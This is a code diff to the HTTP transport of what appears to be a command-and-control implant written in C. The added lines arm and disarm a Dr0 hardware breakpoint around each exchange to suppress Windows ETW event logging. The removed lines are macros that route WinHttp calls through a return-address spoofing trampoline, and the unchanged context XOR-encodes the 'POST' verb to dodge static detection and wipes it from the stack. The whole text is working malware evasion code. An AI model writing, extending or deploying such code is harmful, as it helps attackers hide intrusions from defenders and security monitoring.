@@ -4,6 +4,7 @@
 #include <Command.h>
 #include <Core.h>
 #include <Spoof.h>
+#include <Etw.h>
 
 #include <iptypes.h>
 #include <iphlpapi.h>
@@ -17,14 +18,6 @@
 
 /* HTTP verb, XOR-encoded (key 0x5A per byte) so "POST" does not sit in .rdata */
 static const UCHAR VerbXor[ 10 ] = { 0x0A, 0x5A, 0x15, 0x5A, 0x09, 0x5A, 0x0E, 0x5A, 0x5A, 0x5A };
-
-/* Call a WinHttp API through the return-address spoofing trampoline when a
- * kernel32 gadget is available (SpoofInit), else directly — either way the
- * same import is used, only the visible return address differs. */
-#define SPOOF_NARG( _1,_2,_3,_4,_5,_6,_7,_8,N,... ) N
-#define SPOOF_PICK( ... ) SPOOF_NARG( __VA_ARGS__, SPOOF_G, SPOOF_F, SPOOF_E, SPOOF_D, SPOOF_C, SPOOF_B, SPOOF_A, SPOOF_X )
-#define SPOOF_CALL( fn, ... ) \
-    ( SpoofReady() ? ( HANDLE ) SPOOF_PICK( fn, __VA_ARGS__ )( fn, __VA_ARGS__ ) : ( HANDLE ) ( fn( __VA_ARGS__ ) ) )
 
 BOOL TransportInit( )
 {
@@ -186,6 +179,9 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
 
     HttpEndpoint = Instance.Config.Transport.Endpoint;
 
+    /* swallow ETW event writes for the duration of this exchange */
+    EtwBpArm();
+
     /* decode the HTTP verb off .rdata */
     {
         SIZE_T i;
@@ -292,6 +288,7 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
     }
 
 LEAVE:
+    EtwBpDisarm(); /* clear the Dr0 breakpoint before any further activity */
     memset( HttpVerb, 0, sizeof( HttpVerb ) ); /* clear the decoded verb from the stack */
     WinHttpCloseHandle( hSession );
     WinHttpCloseHandle( hConnect );
